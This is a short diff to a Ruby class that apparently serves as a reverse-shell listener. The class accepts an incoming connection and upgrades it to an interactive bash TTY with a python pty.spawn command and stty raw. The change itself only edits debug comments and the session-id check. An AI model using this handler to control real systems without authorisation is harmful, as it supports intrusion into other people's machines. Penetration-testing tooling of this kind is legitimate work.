@@ -9,6 +9,8 @@ class ShellProcess
     server = TCPServer.new port
     t = @pp.print_time_thread("Waiting for shell...")
     @socket = server.accept
+    #p @socket.methods.sort
+    #p @socket.remote_address
     t.kill
     puts ""
     @pp.print_success("Received a connection\n")
@@ -32,19 +34,19 @@ class ShellProcess
     @pp.print_success("Execed into bash temporarily\n")
     #python -c 'import pty; pty.spawn("/bin/sh")'
     @socket.puts "python -c \'import pty; pty.spawn(\"\/bin\/bash\")\'"
-    @socket.puts "stty raw -echo && echo #{@session_id}"
+    @socket.puts "stty raw -echo"
+    @socket.puts "echo #{@session_id}"
     output = ""
-    while output.gsub("\r", "").scan(@session_id).length != 3 do
+    while output.gsub("\r", "").scan(@session_id).length != 2 do
       readable = select([@socket])[0]
       readable.each do |stdio|
         output += stdio.read_nonblock(2**24)
-        #puts "================"
-        #puts output
-        #puts output.gsub("\r", "").scan(@session_id).length
+        #puts "================================"
+        #p output
+        #p output.gsub("\r", "").scan(@session_id).length
       end
     end
     #puts output
-
     @pp.print_success("Successfully moved to a python pty\n")
     @prompt = ""
     @log_file = File.open("./.shell_logs", "w")
